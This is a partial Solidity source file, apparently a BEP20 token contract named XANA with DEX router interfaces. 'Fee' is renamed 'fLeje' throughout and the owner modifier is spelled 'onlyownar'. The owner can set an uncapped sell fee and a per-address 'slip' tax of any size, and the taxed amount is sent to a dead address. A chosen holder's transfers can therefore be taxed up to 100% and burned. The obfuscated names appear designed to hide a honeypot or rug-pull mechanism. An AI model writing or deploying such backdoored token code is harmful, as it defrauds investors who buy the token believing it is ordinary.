...
interface IUniswapV2Factory {
    ...
    function fLejeTo() external view returns (address);
    function fLejeToSetter() external view returns (address);
    ...
    function setfLejeTo(address) external;
    function setfLejeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfLejeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfLejeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfLejeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfLejeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfLejeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract XANA is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfLeje = 0;

    uint256 private _defaultBuyfLeje = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfLeje;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfLeje = _value;
    }

    function setSlipfLeje(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfLeje[_address] = _value;
    }

    function getSlipfLeje(address _address) external view onlyownar returns (uint256) {
        return _slipfLeje[_address];
    }


    function setMAccountfLeje(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfLeje(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefLejeAmount = 0;

        if (rF) {
            uint256 tradefLeje = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefLeje = _defaultSellfLeje;
                }
                if (from == uniswapV2Pair) {

                    tradefLeje = _defaultBuyfLeje;
                }
            }
            if (_slipfLeje[from] > 0) {
                tradefLeje = _slipfLeje[from];
            }

            tradefLejeAmount = _Amount.mul(tradefLeje).div(100);
        }


        if (tradefLejeAmount > 0) {
            _balances[from] = _balances[from].sub(tradefLejeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefLejeAmount);
            emit Transfer(from, _deadAddress, tradefLejeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefLejeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefLejeAmount);
        emit Transfer(from, _to, _Amount - tradefLejeAmount);
    }
